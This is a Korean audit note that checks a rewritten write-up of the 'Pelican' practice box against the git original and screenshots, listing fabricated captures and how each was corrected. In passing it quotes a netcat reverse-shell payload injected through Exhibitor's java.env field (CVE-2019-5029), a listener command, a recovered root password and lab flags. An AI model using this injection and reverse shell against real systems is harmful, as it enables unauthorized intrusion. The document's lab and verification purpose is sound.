---
type: audit
box: Pelican
date: 2026-08-26
---

# Pelican 적대적 검증 + 정정

대상 `03. PG\Pelican.md`(개작본 475행) · 개작 전 `03. PG\_backup\Pelican.md.bak`(1099행) · **git 원본 `15671e5:"03. PG/Pelican.md"`(389행, 사람이 손으로 쓴 최초판)**.

⚠️ **결정적 증거원은 git 원본이었음.** `.bak` 은 최초판이 아니라 **직전 개작본**(커밋 `aba5a29`)이라 그 자체가 이미 2차 가공물임. 지시받은 「`.bak` 과 diff」만 했으면 아래 ①②를 못 잡았음.

## 근거 출처

| 출처 | 내용 |
|---|---|
| `~/PG/Pelican/nmap.log` | 2868B · md5 `92084d584c6c6cdbc5eb59e52fc2c195` · mtime 2026-06-15 10:31:13 +0900. **박스 산출물은 이것뿐** |
| git `15671e5:"03. PG/Pelican.md"` | 최초판. `ps -ef` 전문 115행 · `strings core.513` 전문 134행 · 임베드 8장 |
| `파일보관\Pasted image 20260615{104052,104131,104628,104646,104804,104827,110647,110738}.png` | 8장 전부 직접 열어 대조(저해상도 4장은 LANCZOS 3× 확대 후 재판독) |
| Kali 직접 실행 | `su`/`sudo` TTY 동작 검증(util-linux 2.41.2) |
| `03. PG\_PLAYBOOK.md` | 앵커 실재 확인 `A-3-10`(1563행) · `B-1-10`(2527행) · `A-2-27`(1121행) |

---

## 고친 것

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| `└─$ sudo nmap -sCV -p- …` | **실제로 친 명령이 아님.** git 원본은 `nnmap 192.168.115.98`. 개작본은 별칭 전개형 명령 + 화면에 뜬 적 없는 `-oN` 파일 헤더(`# Nmap 7.98 scan initiated …`)를 대화형 프롬프트 아래 붙여 **캡처처럼 보이게** 만듦. `.bak` 에 있던 「원본에는 `nnmap` 으로 기록돼 있다」 캡션도 삭제돼 있었음 | 프롬프트·명령·헤더/푸터를 git 원본 화면 출력으로 복원(`Starting Nmap 7.98 … at 2026-06-15 10:30 +0900` / `Nmap done: 1 IP address …`). 캡션에 별칭 전개형과 `nmap.log` 형식 차이를 명시 |
| ① `— 출처: … (`ps -ef` 전문은 관측 없음 — 위 두 줄만 원본에 남음)` | **허위 부재 주장.** git 원본에 `ps -ef \| grep -i 'root'` 전문 115행이 그대로 있음 | 캡션을 「전문은 커널 스레드 포함 115행」으로 정정. 발췌를 4행으로 늘려 `443 cron → 469 CRON → 487 sh -c while true` 계보를 복원(고정폭 컬럼 원문 그대로). ZooKeeper JVM 전체 명령줄(PID 10397)을 코드펜스로 복원 — `jmxremote.local.only=false` 주장의 유일한 근거인데 산문으로 압축돼 있었음 |
| ② `strings core.513` 코드펜스 | git 원본과 **3행 어긋남**: `////////////////` 1행 삽입, `8!z=` 삭제, `P z=` 1행 삭제 | 파이썬으로 git 원본 블록을 추출해 통째 치환. 재대조 결과 134행 **바이트 일치** |
| `strings core.513 원문(전체 130줄 중 핵심 구간)` | 발췌가 아니라 전문이고 130행이 아니라 134행 | `strings core.513 전문(134행)` |
| `— 출처: `…110647.png`(원본은 스크린샷 캡처 …)` | **출처 오귀속.** 그 스크린샷은 `@-z=`~`h?z=` **8행만** 담은 발췌인데 134행 전체의 출처로 적혀 있었음 | 전문은 셸 세션 기록, 스크린샷은 자격증명 구간 8행 발췌로 분리 표기 + 임베드 복원 |
| `└─$ rlwrap nc -lvnp 4444` | 스크린샷 실측은 **`-lnvp`**. 옵션 문자 순서를 바꿔 옮김 | `-lnvp` 로 정정(5× 확대 재판독으로 확정) |
| `┌──(kali㉿kali)-[~/PG/Pelican]` / `└─$ nc -lvnp 4444` (리스너 준비 펜스) | 스크린샷(`[~]` · `rlwrap nc -lnvp 4444`)과 **cwd·명령이 둘 다 다른** 창작 블록. 같은 노트 안에서 자기 증거와 모순 | 펜스 삭제, 산문 한 줄로 대체(원문은 아래 「삭제한 것」에 인용) |
| `Pasted image 20260615104131.png` 누락 | **임베드 통째 소실.** 노트에도 없고 이관 제안서에도 없음 | 복원. 검색어 `zookeeper 3.4 6 1569965 exploit` — 결과에 이 박스의 외부 walkthrough 가 떠 있어 104646 이 외부 자료라는 판정의 **양성 증거**가 됨 |
| `Pasted image 20260615104804.png` 임베드 제거 | 텍스트 전환 자체는 타당하나 전환 과정에서 `-lnvp`→`-lvnp` 오기가 났음 = 전환이 무손실이 아니었음 | 텍스트 정정 + 임베드 복원(임베드 5→8장, git 원본과 동수) |
| `(Config 탭, `java.env script` 필드 편집 화면)` (104052) | 화면에 있는 **주입 전 필드 원값을 통째로 누락** | `export JAVA_OPTS="-Xms1000m -Xmx1000m"s` 를 코드펜스로 복원. 페이로드가 이 줄을 **지우지 않고 덧붙여졌다**는 사실을 본문·Steps 3번에 반영 |
| `Commit 직전 실제 필드 상태` (104628) | 화면은 `Editing` 토글 **OFF** · `Commit...` 버튼 **비활성** = 커밋 「직전」이 아니라 저장 **후** 상태 | 「주입 후 실제 필드 상태 … 이미 커밋돼 저장된 상태」로 정정. 104628(10:46:28)이 104646(10:46:46)보다 18초 먼저인 시각 관계도 명시 |
| `CVE-2019-5029 검색 중 참조한 자료로 «추정»` | 104131 복원으로 추정이 아니라 근거 있는 판정이 됨 | 「참조한 외부 자료임」으로 확정 서술 + 판정 근거(브라우저 크롬 부재 · IP/포트 불일치) 명시 |
| `수동 SQLi 여부와 무관한 순수 설정 조작이라` | 이 박스에 SQLi 는 없음 — 다른 노트에서 딸려온 문장 | 「순수 설정 조작이라」로 정리 |
| `su 가 TTY 없이도 통과한 것은 정상 동작` | TTY 부재가 이 박스에서 확정된 사실이 아님(업그레이드 명령 관측 없음)인데 단정 | 「TTY 승격 기록이 없는데 `su` 가 그대로 통과한 것은 이상 현상이 아님」 + `sudo` 쪽도 `-S`·`-A` 로 우회된다는 단서 추가 |
| 110738·104827 캡션의 「관측 없음」 서술 | 110738 캡션이 「`whoami` 한 화면 증거 없음」이라 적었으나 화면에 `whoami`→`root`+플래그가 **함께** 있음 | 실제로 없는 것(`hostname`·`ip a`·`date`)만 남기도록 정정 |

## 삭제한 것 (되살릴 수 있게 원문 인용)

```markdown
리스너를 먼저 띄움:

```bash
┌──(kali㉿kali)-[~/PG/Pelican]
└─$ nc -lvnp 4444
```
```
근거 — `파일보관\Pasted image 20260615104804.png` 에 남은 실제 리스너는 cwd `~` 에서 `rlwrap nc -lnvp 4444`. 위 블록은 cwd·명령·옵션 순서가 전부 다르고 어느 산출물에도 대응물이 없음. 같은 노트 안에서 자기 스크린샷에 반박당하는 유일한 블록이었음.

⛔ **커널 스레드 포함 `ps -ef` 전문 115행은 「삭제」가 아니라 「미복원」임.** git 원본에 보존돼 있고(`git show 15671e5:"03. PG/Pelican.md"`), 심사관 재현에 기여하지 않아 깊이 기준상 본문 복원은 하지 않음. **다만 「관측 없음」이라고 적는 것은 별개의 오류라 그쪽을 고쳤음.**

## 반증한 것 — 지적으로 올랐다가 노트가 옳았던 것

1. **「`local.txt` 값 `e7318ea0ac983323e5625a0d43cbdfb2` 는 출처가 없다」 → 반증.** git 원본·`.bak` 모두 값이 없어 개작본이 새로 만든 값처럼 보였으나, `Pasted image 20260615104827.png` 를 3× 확대해 한 글자씩 대조한 결과 **완전 일치**. `4`↔`f` 오독도 없음. `proof.txt` `3da5b5076fd3f0523b94859c757d46f0` 도 110738 과 일치.
2. **「`su`/`ClogKingpinInning731`/`whoami`/`root`/`cd /root`/`cat proof.txt` 블록이 프롬프트 없는 재구성이다」 → 반증.** 110738 스크린샷이 **정확히 그 7행, 프롬프트 없이** 그대로임. 개변 0.
3. **「`su` 가 TTY 없이 통과했다는 서술이 틀렸다」 → 반증.** Kali 직접 실행 — `printf 'wrongpw\n' | su nobody -c id` 가 TTY 없이 `Password: su: Authentication failure` 를 반환(util-linux 2.41.2). `sudo` 쪽만 패스워드 프롬프트에 TTY 를 요구함. `_PLAYBOOK` `A-3-10` 의 자체 정정본과도 일치.
4. **「`_PLAYBOOK#A-3-10` 링크가 댕글링이다」 → 반증.** `A-3-10`·`B-1-10`·`A-2-27` 세 앵커 모두 실재. 제목 문자열도 완전 일치.
5. **「Kali 프롬프트 `┌──(kali㉿kali)` 는 에이전트 창작이다」 → 반증(부분).** `Pasted image 20260615104804.png` 가 그 프롬프트를 **화면 그대로** 담고 있음 — 사람이 대화형 터미널에서 푼 레거시라 실측임. 지우지 않음. **단 nmap 블록의 프롬프트는 실제 친 명령(`nnmap`)과 다른 명령을 달고 있어 그쪽만 정정함**(프롬프트 자체가 아니라 명령이 문제였음).
6. **「4항목·`Port Scan Results`·nmap raw 라인이 빠졌다」 → 반증.** 두 finding 모두 4항목 완비, 포트 표 존재, `22/tcp    open  ssh …` raw 라인 보존(`extract.py` `PORT_RE` 정상 수집 가능). 무태그 코드펜스 0(12개 전부 태그).

## 작성자 주장 검증 (지시 ⓔ)

| 주장 | 판정 |
|---|---|
| 「`20260615104646.png` 는 외부 walkthrough 참고자료(IP `.236`·포트 `80`), 진짜 Commit 화면은 `20260615104628.png`」 | **확인.** 104646 = 브라우저 크롬 없는 문서 페이지, `$(/bin/nc -e /bin/sh 192.168.45.236 80 &)`. 104628 = 주소창 `http://192.168.115.98:8080/exhibitor/v1/ui/index.html`, 필드에 `192.168.45.179 4444`. **바꿔 읽은 흔적 없음** |
| 「그렇게 캡션을 잘못 단 것은 «옛 노트»다」 | **부분 반증.** 잘못 단 것은 `.bak`(직전 개작본)이고, **git 최초판은 이미 `exploit 획득` / `exploit 실행` 으로 옳게 캡션했음.** 오귀속을 만든 것은 사람이 아니라 이전 개작 단계임 |
| 「미임베드 7장은 전부 다른 박스(Astronaut·GRAV CMS)다」 | **반증.** 그날 15장 중 Pelican 시간대(10:40~11:07)는 8장이고 **8장 전부** git 원본이 임베드했던 것임. 나머지 7장은 09:29·09:48·13:29·13:40·14:06·15:36·15:37 로 시간대가 분리돼 다른 박스가 맞으나, 「미임베드 7장」이라는 셈은 **개작본이 3장을 뺀 결과**를 전제한 것이라 성립하지 않음. 실제 미임베드는 개작 시점 기준 3장(104131·104804·110647)이었고 셋 다 Pelican 임 |

## 이관 제안서 검증 (지시 ⓗ)

`03. PG\_AUDIT\Pelican-playbook.md` 의 「신규」 3건을 증상으로 `_PLAYBOOK.md` 전수 검색:

| 제안 | 검색어 | 판정 |
|---|---|---|
| 2 (`Did not follow redirect to`) | `follow redirect` · `http-title` | 기존 항목 **없음** → 신규 판정 정확. 인접 항목 `A-16`(문서 사이트 손절)과 상호 참조 권장 |
| 3 (코어 덤프 자격증명) | `gcore` · `코어 덤프` · `LSASS` · `프로세스 메모리` | **히트 0** → 신규 판정 정확 |
| 4 (모르는 서비스 절차 / ZooKeeper 4자 명령) | `ZooKeeper` · `4자 명령` · `모르는 서비스` | **히트 0** → 신규 판정 정확 |

제안 5의 시간 서사(합계 37분)는 스크린샷 파일명(Windows KST)과 `nmap.log` mtime(SSH 세션 TZ=KST 렌더)이 같은 축이라 **환산 불필요**하고, 10:30:34 → 11:07:38 = 37분으로 **일치**.

## 문체

`pg-doc-reviewer` 이관 대상 — **0건.** 서술형 종결·번역투는 발견되지 않았음(개작본이 이미 개조식). 「문체 명목의 실측 파괴」에 해당하는 건은 위 「고친 것」의 nmap 블록·리스너 펜스·`-lnvp` 3건이고 그것은 본 감사 관할로 처리했음.

## 색인

- `manual_tags: true` · `tech_count: 3` — `tech/web/cmd-injection`·`tech/payload/revshell`·`tech/lin/sudo-abuse` 전부 실사용. 유지
- `cves: [CVE-2019-5029]` — 본문에 등장하는 CVE 는 이것 하나이고 실제 악용한 것이라 `manual_cves` 불필요. 유지
- 값이 든 줄에 주석 없음. `ports`·`services` 는 `nmap.log` 와 일치
- ⚠️ **색인 갱신 필요** — 본문 행수·코드펜스가 바뀌었으므로 총괄이 `refresh.ps1` 을 돌릴 것(본 감사에서는 실행하지 않음)
